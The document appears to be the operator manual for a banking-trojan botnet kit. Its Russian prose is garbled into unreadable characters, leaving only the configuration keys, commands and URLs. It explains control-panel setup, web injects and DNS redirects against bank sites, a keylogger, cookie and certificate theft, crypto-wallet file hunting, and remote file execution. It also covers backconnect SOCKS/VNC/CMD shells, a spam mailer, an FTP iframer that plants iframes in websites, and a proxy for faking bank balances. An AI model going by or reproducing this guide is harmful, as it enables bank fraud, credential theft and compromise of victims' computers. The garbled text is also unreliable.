
� 1. ���������� � ���������

����� ������� ���������, ���������, ��� ������������ ������ ������� ��� VDS ������������� ��������� ��������.
������� ����������� ������������:
Intel Core i3 3,1 ���/4GB RAM/500 �� 
Intel Xeon E3-1220V2 3,1 ���/8GB RAM/1 ��
������������ �������  Debian 7, Debian 6, Debian 5, Fedora 14, Fedora 15, CentOS 5, CentOS 6, Ubuntu 10, SuSe 10.3, FreeBSD 10.1. 
��� ������� ���������, ����� ������������ Direct Admin ��� cPanel � ����� SSH-��������: Putty/Kitty/SecureCRT/Xterm

������ ��������� �������, ����������� ������� VDS �� ��������� Windows2008/2012 ��� ����������� Backconnect-����� VNC/SOCKS/CMD � ������. �� �������� ��������� Windows Firewall & UAC
������ Intel Xeon 2 Core / 2GB RAM / 30GB HDD

����� ������� �������������, ���������� ������������� PHP5 �� �������.
������� ���� php.ini ������� ���������� ��������� � /etc/php5/cli/php.ini
���� ��������� �� �������, �� ����� �������������� �������� "find / -name "php.ini" -print"
���� ����� ������� WinSCP (http://winscp.net)
� �������� �������� ���� ����������:

post_max_size = 50M
upload_max_filesize = 1024M

+ ���������� Apache �������� "service httpd restart" ��� "service apache2 restart" 

����� ����� ��������� ����� ����� "webadmin" � ���������� ���-�������.

� api.php �������� ���� define('API_TOKEN_KEY', 'da39a3ee5e6b4b0d3255bfef95601890afd80709');  

��� ���������� webadmin;webadmin/files;webadmin/system;webadmin/system/data;webadmin/files/webinjects;webadmin/public;system/data/TokenSpy; ��������� chmod 0777

��������� ������� ������������ �� ������ http://localhost/install/
�� ���� ����������, ������� �������� �������� �� "Crypt Key(as a build)", ����� �� ���� ������ ���� � ������� �������.
����������� ������������� ����� "install" � ����� ������������, � ����� ����� cp.php (�����-������) gate.php � file.php
�������� ������� � cron'e ��� ���������� ������� �������, ��� ��������� cp.php ����� �������� ��������� ��������.

��������� �����-������ ���������� �������, �� ��� �� ��������� �� �������� �������:

1) ������������ Jabber-������� ��� ������������� � �������� ���-�����������. ��������� ������, �����, ������ � ������� "���������(Settings)"
2) �� ������������� ������������ ����� "������ ������� � ��������� ����." ��� �������� �� � ����, ����� ������������ ������� mysqldump -u root -p --all-databases > all_dbs.sql
3) ���� � ��� ���� �������, ������� ����� ��������� ��� ���, �� �������� ���������� ������������: ������������ > �������� ������ ������������ > ������� ��� ����� �����  r_svc_crypter_crypt & r_svc_crypter_pay. ���� ������������ ������ ��������� ���� ������ ����� ���� �������������� �������. ���������� ��� ���������� ��������� ������ � ���� ���� �� �����. �����, ������������� �������� jabber ����������� �������� � ������� �������� �� ������� scan4you.net, �������� ��� �� ������� �������� � ���������� "������������ ���"
4) � ������� "Backconnect ������" ���������� ��������� VNC-Server IP, �������������� ���������� ����� �� ���������� "webbackconnect" � �������� ���������� htdocs XAMP https://www.apachefriends.org/ru/download.html/Apache �� ����� �������������� VDS. �����, ��������� Windows Firewall & UAC.


� 2. ������� �������������

1) �������� ��������������� �� �������� ������. � ��������� �� ������ ������ ������, ��������, ��������, ��������. ������ Bitcoin(�� ����� BTC-E)/Perfect Money/Paymer
2) ��������� ������������ ��������� �� ������� ������ ������������ �����, �� �������� ����������� ����������� �� ����� ������������ � ��������������� ������������� ��������������(��.����� 10)
3) ����� ������ ��������� �������� �������: �� ����������� �������� ������ ������, ��� ��������������� ����������������� ������ �� VPS, � ������� ������ �� ������ ������ ������������� ����� ������ � ������������, �� ��������� ����� �� ������ �������� ��� ���������� ������ �� 30 ����, VPS ������������ �� ����. �� ����� �������� ������, ��� ���������� ��� ���������� �����, ������� ������������� ���������� ������������� �� ����� VPS. �� ������� ����� �� ������ ������� ������ ��������, ���������� � ���� builder, "webadmin", "webbackconnect". Builder ������������� � VPS, ���-����� �� �������� ��� ������ �������� �������. 
4) ��������� ��������� ����� ��� ������� ������� ���-������. ���������� ������������� �������� ������ � ���������� ���������(�������������� �������� �� ����)
5) ��� �������� �������� ��� �� � ������ ������� �� ������, ����������� �������� ������� � ��, � ��������� ������ ��������� ���������. �� ����������� ���������� ������� ������������ �������� virustotal
6) �� ����������� Jabber ��� ������� ���������� PGP/OTR. 
7) ��� �������������, �������� ���������� ��������� � ��������� �� ��� ������. ��������� SSH/FTP + RDP/VDS ������, ���� ��� ������ ������.
8) ���� �� �������� �� ��� ����� � ��������������� �������� ���.
9) ������ ����� ������������ ��� � ������-���, ���������� ������ � ������� ���������� �����, �� �������. ����������� ���������� ��������� �� ���� ��������� � ��������� �����������, ���������� ���������� ����������. 
10) ����� ������� ��������������, �������� ��������� ����� �� ��������� ����� ������ ��� ��������� ������� � ���������� ������� �����������, � ������: ��������� ���������� ���������, �������� ������, �������� ������� � �.�

� 3. ������������

url_config1-10 [�� 10 ������ ������-������, 1 �������� �� ����� ������� ������� � 9 ��������. ��� �������� ��������, ����������� ������ InterGate � �������, ����� ���������� ������-����� �� ������ �������, ��� ��������� �������. �������� ������� ������������ �� ������ ������������� ��������� ������-����� � ������ ������� ������� ���. �� �������� �������� exe, config's files � ����� files/ ]
timer_config 4 9 [����� ���������� ����������������� ����� � ������� | �������� ��������� �������]
timer_logs 3 6   [���������� ����������� ����� � ������� | ��������� ������� ����� _ ����� ]
timer_stats 4 8  [���������� ��������� ����� ������ � ����������� ���������� � ������� | ��������� ������� ����� _ ����� ]
timer_modules 4 9 [���������� ��������� �������������� ���������������� ������ | ��������� ������� ����� _ �����. ������������� ��������� ����� �� ��������� ��� � timer_config ]
timer_autoupdate 8 [����� ���������� ���-����� � �����]
insidevm_enable 0/1 [�������� ������ � ����������� ������: 1 - �� | 0 - ���]
disable_antivirus    0/1 [1 - ��������� ���������� "Antivirus", ��������� ��� ������� ���, ������� ���������� ������ Zeus/Citadel/Citra | 0 - �������� ����������(�������������). ]
disable_httpgrabber  0/1 [1 - ��������� �������� http:// ����� � IE | 0 - �������� �������� http:// ����� � IE] 
enable_luhn10_get    0/1 [ �������� ������� CC � GET-�������� http/https ]
remove_certs         0/1 [ �������� �������� ������������ � IE ��������� ]
report_software      0/1 [ 1 - �������� ���� ���������� Installed Software, Firewall ver, Antivirus ver | 0 - ���������]
disable_tcpserver    0/1 [ 1 - ��������� �������� ����� Socks5(�� Backconnect!) | 0 - �������� ]
enable_luhn10_post   0/1 [ �������� ������� CC � POST-�������� http/https]
disable_cookies      0/1 [1 - ��������� ������� cookies-��������� IE/FF | 0 - �������� | use_module_ffcookie - ��������� ��� �����]
file_webinjects "injects.txt" [���� � ���������, �������������� ����� ��, ��� �������� ��������� ������-������. ����������� �� ��������� timer_config]
url_webinjects "localhost/file.php" [���� �� file.php, ���������� ������� "���-�������" ��� ��������� instant-�������� ��������]
AdvancedConfigs [ ������ �� ��������� ������-������, ��� ������� ��� !��� ��� ������� ���������� � �������! � url_config1 ����� ����������]
entry "WebFilters" [ ��������� ������� ��� URL'��: �����(������ #), ���������(������� @ - ������������������ ���������� �� ������� ����� � �������� ������� � @@ - ������������ �������� ������ ������� ������), ������������� (������ !), ����������� POST-��������(������ P), ����������� GET-��������(������ G)  ]
entry HttpVipUrls [������ URL'�� ��� ����������, �� ��������� � ���� �� ������� ����� "facebook*" "*twitter*",  "*google*", ������� ��� ����� ����� ������, ��� ����� ����� ������������� ]
entry "DnsFilters" [DNS �������� �� ������ �������, ������ ����� *bankofamerica.com*=159.45.66.100 | ��� ������ �� bankofamerica.com ����������� wellsfargo.com | �� ������������� ����������� AV � ��������� ������������ ����������� ������]
entry "CmdList" [������ ��������� ������ ��� ������� ����� � �������� �� �� ������]
entry "Keylogger" [������ ��������� ��� ������ KeyLogger'a. �������� time - ����������������� ������ � �������, ����� ������������� ��������]
entry "Video" [��������� �����-���������� ������ | x_scale/y_scale - ���������� ����� | fps - ���������� ������ � �������, �� 1 �� 5 | kps - ������� ���������� ��������, �� 5 �� 60 | cpu 0-16 �������� ���������� | time - ����� ������ � �������� | quality 0-100 �������� ��������]
entry "Videologger" [processes "" - ����� ���������� ������ ���������, �� ������� ������������ �����������, �������� ��� ������ �����, �������� calc.exe, ��� � ������� ����� *calc*]
entry "MoneyParser" [��������� Balance Grabber'a | include "account,bank,balance" - ����������� ������� �������, ���� �� https:// �������� ������������ ���� �� �������� �������� ����. | exclude "casino,poker,game" - �� ������������ �������, ���� ����������� ���� �� ������������� ����.]
entry "FileSearch" [ ����� ������ �� �������� �����, ����� �������� � ������ ���� ������(File Hunter) � keywords ������������� ������ ������ ��� ��������� ** ��� ������ �� �������� �����. �������� multibit.exe ������ ������������ ����.����������, *multibit* ������ ���������� ���� �����, ��������������� �������� ����� | excludes_name - ��������� ����������/�������� ������ �� ������. excludes_path - ��������� ������� ��������� ����������, ����� ��� Windows/Program Files � �.� | minimum_year - ����� ���� ��������/��������� ����� ��� ������� ������. ����� �������� � ���������� ������. ��� ���������� ���������� �������� ������ �� ���� ����������. ]
entry "NetScan" [hostname "host-to-scan.com" - ������ ���������/��������� IP ��� ������������.  scantype "0" - �������� �� ����� IP-��������� ������� � �����, � �������, scantype "0" �������� �������������� ���� IP � hostname, scantype "1", ������� ����������� ������������ ��������� 10.10.10.0-255, scantype "2" �������� �������������� �������� 10.10.0-255.0-255] 
������ 1 {hostname "10.10.0-255.0-255" addrtype "ipv4" porttype "tcp" ports "1-5000" scantype "2"}
������ 2 {hostname "10.10.1.0-255" addrtype "ipv4" porttype "tcp" ports "1-5000" scantype "1"}]
entry "WebMagic" [ ��������� WebProxySrv, ������ ���-������� �� ����� ����������, ��������� ������������ ������ � ������ ���������� ��������������� �� ����, �������� ��� ������������� ��������, ��� ����������� �������� ������� � ��������� �� ��������� ������ ��������� �������� �� ��������� �������, ������� ��� ����� ������ ����� ����� ����������, ��������� ������ �������� �������� ��� ������� � https:// ������� �� ������ ���� � ��������� backconnect-����������. ������ �������� �������� ���������� � F.A.Q ]

� 4. �������

user_execute <url> [��������� ������������ ����]
user_execute <url> -f [��������� ������������ ����, ������ ���������� ���� � ����������� ������� ������]
user_cookies_get [�������� IE Cookies]
user_cookies_remove  [������� IE Cookies]
user_certs_get [�������� .p12 ����������� . ������ �� �����������: pass]
user_certs_remove [������� �����������]
user_homepage_set <url> [���������� �������� ��������]
user_flashplayer_get [�������� .sol ����� ������������]
user_flashplayer_remove [������� .sol ����� ������������]
url_open <url> [������� ������������ ������ ��������� �� ���������]
dns_filter_add <hostname> <ip> [���������� ������ ��� ���������(����������) *bankofamerica.com* 127.0.0.1]
dns_filter_remove <url> [�������� ������ ��� ��������� *bankofamerica.com*]
user_destroy [����������� ���������� ������ ������ ������� � ������������, ��� ������� ����������]
user_logoff [��������� ����� ������������]
os_reboot [������������]
os_shutdown [����������]
bot_uninstall [�������� ������ ���� � �������������]
bot_update <url> [�������� ���������������� ���� ����, ���������� ���������� ���� (crypt key), ���� ����������� ��� � url_config ]
bot_bc_add socks <ip> <port> [����� Bot > Backconnect Server > Socks5 | �� BC ������� ����������� ������� backconnect.exe listen -cp:1666 -bp:9991 / -bp ���� ����������� ��� ������ �������, -cp ���� ��������� ��� Proxifier/Browser...]
bot_bc_add vnc <ip> <port> [����� Bot > Backconnect Server > VNC Remote Display | �� BC ������� ����������� ������� backconnect.exe listen -cp:1666 -bp:9991 / -bp ���� ����������� ��� ������ �������, -cp ���� ��������� ��� UltraVNC �������]
bot_bc_add cmd <ip> <port> [����� Bot > Backconnect Server > ��������� ������ | �� BC ������� ����������� ������� backconnect.exe listen -cp:1666 -bp:9991 / -bp ���� ����������� ��� ������ �������, -cp ���� ��������� ��� telnet/putty �������]
bot_bc_remove <service> <ip> <port> [���������� ���������� ����, ���� ��������� ������� netstat-������]
close_browsers [������� ��� �������� ��������]

� 5. F.A.Q

Q: ��� �������� ���-�������
A: ���-������� ��������� �������� � ������ ����� ���-��������� � ����������/������� ������ �������� �� ������������ ��������.
��� ����� ������� � ���������� ������, � ������� �� ���������� ����� file_webinjects. �� � ���� ����� �� ������ ���������� ��� ������ ������. 
�������� ����� ������ "����� ������" US_Main, ����� "������/������", ����� �������� ������ ���� US � ��������� ����������� ���������� �������� c ������ "��������" (�� ��������� �� �������������� ������, �� ��� ��� ���� �� ������� ��������)
������ ���������� ������ ������� ���������, �������� "����� ��������"
�������� ��������: US_Make
�������� ��������: US 1 Campaign
���-�������: �������� ����������� �������
� ���� ��� ��������� �������� ������������: ������ BotID/������ ��������/������ �����/����� ����������
Instant-������� �������� � 3 ��������:
Dual [����� ��������� ���-������� + ��������� ���� file_webinjects]
Single [����� ��������� ���-�������]
Disabled [����� ������ ���������� ����� file_webinjects]
� ����� ������ ����� ����������� ���� �� ������� ��� ������� ������. �����, ����� ������� ���������� ������������ c ������� ��������/��������������/�������� �����������, ��� ����� �������� ������ 2 ���������: r_botnet_webinjects_admin & r_botnet_webinjects_coder ��� �������� � ������� "������������".

Q: ��� ���� ��������� API (api.php)
A: ��� ������ �������� � ������� /api.php ����� ��������� Backconnect VNC/Socks-����������; ��������� ������ ����; ��������� Jabber-�����������; ���������� �����;
	Sample 1: api.php/<token>/video/list?botnet=ATM&botId=WIN-ABC123
	Sample 2: api.php/<token>/vnc/connect?botId=WIN-ABC123&protocol=VNC
	Sample 3: api.php/<token>/vnc/connect?botId=WIN-ABC123&protocol=SOCKS
	Sample 4: api.php/<token>/jabber/send?message=Hello%20world!

��� <token> API-��� API_TOKEN_KEY ����������� � ������ �������. ���� ���� ��������� � API �������� �� �������, �� �������������� �������������� ����������� �������� %BOTID%, %BOTNET%.
	
Q: ��� ��������� �������� ������� ��� Account Parser � ������� "Backconnect server"
A: ������� ���������� ��� ���� ����� �������� ������ ��� ��� ����� �� ������ ������ �����. �� ������� Opera/FF/Chrome ������ �� bankofamerica.com � ������� ���� ��� ����� ������ Enter your Online ID, ������ ������ ������� ���� ������������� ���� ��������, ������� "Inspect Element": <input type="text" value="" class="search-text-box" id="id" name="id"> ��� name="id" � ����� �������� �������.
�������������, ������� ��� �������-������'� ����� ��������� �������� �������:
[��� �������: bankofamerica | ����� URL: https://www.bankofamerica.com/* |: ���������: id=*] 
���� ���� ������������� � �������������� �������� Backconnect SOCKS/VNC/CMD-���������� ��� ��������� ���� � �����, �� �������� ��� ���������.

Q: ��� �������� Mailer
A: ������ ��������� ��� ��������� �������� �������� �� e-mail ������������ ���������� PHP.
��� ���������� ������������, ���������� ������� ������ [Download Script] � ���������� ��� �� ����� �� ������������ ������, � �������� ����� ������������� ��������, � www-����������, �������� ��� ���� � php.ini ;magic_quotes_gpc = Off � safe_mode = Off
����� ���� �������� [ Config ] � ��������� ��������� [Master E-Mail (for checkup): "name ; email" ��� e-mail ��� ��������] � Mailer-script URL: http://www.host.com/mailer.php
����� ��������� �������� �� ��� ���������� ������ ��������� E-mail'�� ��������� Bot'a ������� "For BotID" ��� �� ������������ ������ ������ name;email  
�������������� ������� � Subject/Body/Attach.
{name} - Receiver name | {email} - Receiver E-mail | {random} - random chars | {rand0m} - random long number
������������: ����� �� �������� ��� ���� �� ����-��������, ��� �������� �������� � ���� Sender ("email" or "name ; email") ���������� ������ name@{hostname}, � ���� ������ ����� �������������� ����� ������ �����, �.� ��� �������� ��������� FROM: ������ ���� � ����� Spam.

Q: ��� �������� � �������� ���� ������ (File Hunter)
A: ������ ��������� ��� �������� � ������� ����, � ������: �������� ������ ��������� ������ �������� ����������, ������� ������� � ������� entry "FileSearch", ������� �� ����������� ������, ��������� ��������������, ��� ���������� ������� � �������� ����������� ����� �� ��������� �����.
Custom download - ��������� ������� ������������ ���� ���������� BotID, ���� �������� ������ ����, ���� ���� �� �� ������ � ������� entry "FileSearch".
Auto download - �������������� ���������� ������ �� �������� ����� ��� �������� BotID. ��� ��������� �������, ��� ������ ���������� ��������������� ������� � ������ ����, ���� ���� ������������� ����� ����������� � ������� entry "FileSearch". 
���������� � ����������� File Hunter'a ����������� ������������ ��� ��������� �����-���� ������ �� ��������� �����. �������� ������� File Hunter - �������� *coin-������(multibit.dat/litecoin.dat...)
����������� ������ ������ ���� ��� ������ ������������ ���� ������������ ����-������.

Q: ������� ������ �� FTP Iframer
A: ����� ������� ������, ��� � ������ � � Mailer, �������� �������� ����� ��������� �� ������ [ ������� ������ ] � ���������� ��� �� ����� �� ������������ ������, � �������� ����� ������������� ��������, � www-����������, �������� ��� ���� � php.ini ;magic_quotes_gpc = Off � safe_mode = Off
����� ���� �������� ������������, ������ [ ������������ ]
URL ������� iframer ��������� ������ �� �������, ������� �� ����������.
����� ��������: ������ �������� [ �������� ���������� ��������� FTP-��������� � ����� ]
������: [����� "��������"]
����� �������: �����/��������/������������ [����� - �����, ��������� � ������, ���� iframe-��� ��� ��������� � ������, ����� �������� ���. / �������� - iframe-��� ��������� � ����� ����� ����� </body></html>]
������� ������: [������� ������ ������ �� ftp-������, ������� ��� ������� ��������� FTP Connection > public_html(1) > images(2) > gif(3)....]
�����, ���������� "����� ���������" � "������ �������", ����� ����, ����� ����� ��������� ����� ������� ���������� ����������. ����� �������, ������ ����� �������� � cron-������, ������� �� ����������� ������� �������� ��������.

Q: �������� ������� � ������ ������ "�����������" (Neuromodel)
A: ����������� ��������� ����������� ����������� ������������ ������� ��� �������� ���������, ������ ���������� ��������� ��� ������, �������� �������� ��������. �� ������ ��������� ������� ������������, ���������� ������ ����� � ������� �� �� ������� �����,��������� ����� � ����������� �� ��������� ��������� ������. 
� ������ ����� ������������ ����� �������� ��������� ���������. � �������, ��� ���������� ����������� ����� �� ����� � ���������: Bank Acc + CC ��� Bank Acc + ISP E-mail 
��� ������ ������ �������� �������, ����� ���� ������������ ������ �� ������ ���������.

"����� �����, ������� �������� �� ��������� 30 ���� � http://www.bankofamerica.com id=* � ������������� McAfee � ��������� � ������ ��� ���������� �������"

�������� ��������:
1) { ��������: BOA LOGIN | ��������: HTTP POST ������ | ����� URL: htt*://www.bankofamerica.com/* | ����� ������ POST: id=* | ����� ����: 30 | �����: 1 | �������������� �����, ������� �� ��������� ��������: No < 1 }
2) { ��������: AVCheck | ��������: ������������� �� | ����� �������� ��: McAfee* | ����� ����: 30 | �����: 1 ������� �� ��������� ��������: No < 1 }

�������������� �����, ������������ ��� ��������� �����������.
* **No**: ������� �������. ������ �������� ���������� �������� ���� ������ ������ ����. ��� ������ ������� � ��� ������ ������.
������ 1:, ���� ������� 180 ���������� ������� � ���������� ������=2, �� ����� ��������� `180*2` ������
������ 2:, ���� ��� �������� "����� � bankofamerica" ������� ���������� "� ������� �� ����" ">=" "3", �� ����� ����� ��������� ������ ���� �� ��������� `Days` ����, � ������� ��� � ������� ��������� � facebook ���� ��� ��� ���� � ����. 
������: ���� �� ��������� `Days` ���� ���������� �������, ���������� ��� �������� "����� � bankofamerica", � ������� ���� ��� � ����� ��������� `Points` ������.
* **Sum**: ��������� ���������� �������.
`Points` ������ ����� ��������� ���� ���������� �������, ��������������� ������� ��������, ������������� ���������� �������.
��������, ���� ���� ����� `reports_count=180` ���������� ������� � `Points=2`, ��� ���� ��������� ������� `>= 180`, �� ����� ��������� +2 �����.
* **Days**: ��������� ����� �������� ����: ����, ���������� ���������� ������
����� ����� ��������� ���� ����� ����, � ������� ������� ���������� ������, ������������� ���������� �������.
��������, ���� ���� ���������� ������ ���������, ����� � �������, ��� ���� ��������� ������� `>= 3`, �� ����� ��������� + ������.
* **Avg/Day**: Average/Day: ������� ����� ������� � ����� 
����� ����������� ���� � ������� � ����� ��������� ���������� �������, ��������������� ���������� �������.
��������, ���� ����� ���� 7 ���������� �������, � ������� � 2, ��� ���� ��������� ������� `>4`, �� � ������� �� ����� `(7+2)/2=4.5` ���������� ������ � �����, ������ ����� ��������� + ������.
* **Avg/Week**: Average/Week: ������� ����� ������� � ������
���������� `Avg/Day`, �� ���������� ������� ����������� �� ������: ��� �������� ������� ������� ��������.
* **Days/Week**: ������� ����� �������� ���� � ������.
����� ����������� ���� � ������� � ������ �� ���� ���������� ����� �������� ����, ��������������� ���������� ��������.
��������, ���� ��� ������� � facebook ������ ��� ��� � ������, �� ����� ���� �����������, ��� ���� ��������� ������� `>=3`, �� ��� ����� ��������� + ������.

������ ������ ������, ����� ���������� ���������:
"����� �����, ���������� �� ������, ������� �������� � ���� ������� USBank �� ��������� 21 ���� �� ����� 3 ���, ��� ��������� � ��������"

1) { URL = https://onlinebanking.usbank.com/Auth/Login/Login* | HTTP URL ��������� | ����� ���� = 21 | ������� �� ����� 3� ���: �.�. ������� <=3 ���. �� ����, ���� ������� <=3 ������� �� ����� �������� � �������� 1 ����. | SUM() <=3 , 1 ���� }

������ ������ ��������� ���������� ����:
������� �� ����/����� ������� ������, ����������� �� ����.
������� �� ����/����� ���������� ������, ����������� �� ����.
������� �� �������������������� ������ ���� � ������, � �����.
������� �� ��� ������ � ��� ���������� 
	>�������/���������� LUHN10(��)
	>�������/���������� �������������� e-mail (pop3 or web-link)
	>�������/���������� FTP-���������.
	>����� �� keyword-��
������� �� ������ ���� "Installed Software", ����������� ��������� ����������� �� ����������� ��.
������� �� ������ ���� "CMD", ���������� ������������ keyword'�.
������� �� ��������� ������������� URL'a ��� ���������� URL'��
������� �� ������� POST-����������.


Q: � ���� �� �������������� ���� ��� ����������� �������� � ��������.
A: ���� ��� ���������� ���������� ������� ��������:

	1) �������� file.php :: define('FILEPHP_DEBUG_MODE', 0); � ��������� �������� � 0 �� 1
	2) �������� gate.php :: define('GATE_DEBUG_MODE', 0);  � ��������� � 0 �� 1-3
	3) �����, �� ������ ����������� ������� InterGate �� �������� � ������� 1.
���� ������ ��������� ��������������� � ���������� �� ���������.

Q: ��� ���� ��������� WebProxySrv? ��� ���������� ������ �������� ?
A: ��� ������ � WebProxySrv(WebMagic) �������������� �������� �������:

** ������������ ����� �����������������.
	> ?api=system&cmd=test&arg0=<displayed txt string>
** ���������/����������� ���������� � backconnect-�������� �� ����������: SOCKS/CMD
	> ?api=system&cmd=bc_add&arg0=socks&arg1=233.233.233.212&arg2=5194&arg3=connection ok
	> ?api=system&cmd=bc_remove&arg0=socks&arg1=233.233.233.212&arg2=5194&arg3=connection terminated	
** ������ �����������
	> ?api=system&cmd=video_start&arg0=videorecordname&arg1=videostarted
** ���������/����������� ���������� � Backconnect Hidden VNC
	> ?api=system&cmd=hvnc_start&arg0=233.233.233.212&arg1=5194&arg2=connectionok
	> ?api=system&cmd=hvnc_stop&arg0=connectionterminated
** �������� ������ � ������� (��������� ���������)
	> ?api=registry&cmd=setvalue&arg0=<arg0here>&arg1=<arg1here>&arg2=<arg2here>
	 arg0: ��� ��������� global ��� local. ��������� ������������� � �����, ���������� �� ���������� ����� ���������.
     arg1: ��� ����������, ��������� ������.
     arg2: �������� ���������, ��������� ������.
     arg3: ������������ ������ ����� ������, ���� �� �������, �� ������������ ������ ������.
** ������ ������ � ������� (��� �������� ��������� ��������� � ���������)
	> ?api=registry&cmd=getvalue&arg0=<arg0here>&arg1=<arg1here>&arg2=<arg2here>&arg3=<arg3here>
	arg0: ��� ��������� global ��� local. ��������� ������������� � �����, ���������� �� ���������� ����� ���������.
    arg1: ��� ����������, ��������� ������.
    arg2: ��� ������������ �������� text ��� js. ���� ������ text, �� ���������� ������������ ���������� �����.  ���� ������ js, �� ���������� ������������ ��� ���: "%���_���������_�_arg3%"="%��������_����������_value%";
    arg3: ��� ���������� ���������� ���� ������ ��� js � arg2.
����� ��, ���������� ����� ������������ ������� %BOTID%, %BOTNET%  

������ ���������� ��������������� ��������� ������ � �������.
entry "WebMagic"
"WebMagicRemoteProxy"  "http://yourh4x0rhost.com/get_valuescript.php" 
"WebMagicLocalServer"  "%COMMANDSERVER%" 
end

� ������ ��������� WebMagicRemoteProxy �� ������ ���� �����, ���� ����� ������������ ������ �� ��������� ����. � �������, ���� � ��� �������� �� � ������ ��� ������ ������� �� �������, �� ���������� ����� ����� ������� � ������-�������, � ��������� ��������� ��� anti-fraud, �������� ��� ������ �� ������� � �������� �� � ��������� ���-�������, � ������ � �������, � global ���������, ����� ������� setvalue, ��������� ��� ����� �������� �������:
https://www.usbank.com/WebMagicLocalServer/?api=registry&cmd=setvalue&arg0=3921.84&arg1=GBP&arg2=NAME
���� ������ ������������� ��������������� � HTML-��� �������� � ������� ���������� ������ � ������.
�������������, ������ ����������� �� ��� �� �����, ������� ������������ ��� �� ������, �� ������ �� ��� �� ��������� ���-������ ��� ������ ������ � ������ ����, ��� �������� �����-���� ������ ��������� ����������, ������� ����� ���������� ���� ��� ���������, � ��� ������ ���� ����� ��������.
������� ��������, ��� �� ���������� � /magic_folder/ - WebMagicLocalServer ������� �������� � Native API Windows � � ���������������� �� ��������� ������� �� �� ����������.
����� �������� ������ ������, ������� �� �� �������� � ������� �� ������(����������� API.php � JabberController, ���� �� ������ ��������). ��� ��������� ������, ����� ��������� � ������� � API-�������� getvalue
https://www.usbank.com/WebMagicLocalProxy/?api=registry&cmd=getvalue&arg0=3921.84&arg1=GBP&arg2=NAME
������ � ����� ��������� JSON-������, ������� �� ������ ���������� ��� ��� ������ � ��������� ������ ������� � ������� ��� �� ���������� api.php
�����, ��� ����� ������������ ������ 
https://www.usbank.com/WebMagicRemoteProxy/?var=JSON_INFO

�������� �� ��, ��� � HTML-���� ����� ����� �������������� ���� "www.usbank.com", � ������ ������ ������ ����� �� "WebMagicRemoteProxy"  "http://yourhost.com/get_valuescript.php" � �����������, ������� �� �������.

Q: � ��� ������� debug-������ �� release-������?
A: Debug-������ �������� �� ��� ������, ���� ��������� �����-���� �������� � ���������� ������� ����������� �����, � ���� ������, ���������� ���� "debug.txt" ������� ��������� � ����� C:\ (WinXP) ��� �� Desktop'e � Vista/7/8.1, ���� ���� ����������� ���������� � ���������� ������� � ����. � debug-������ ��� �������� ����������� � �������, � ������� �� release-������. 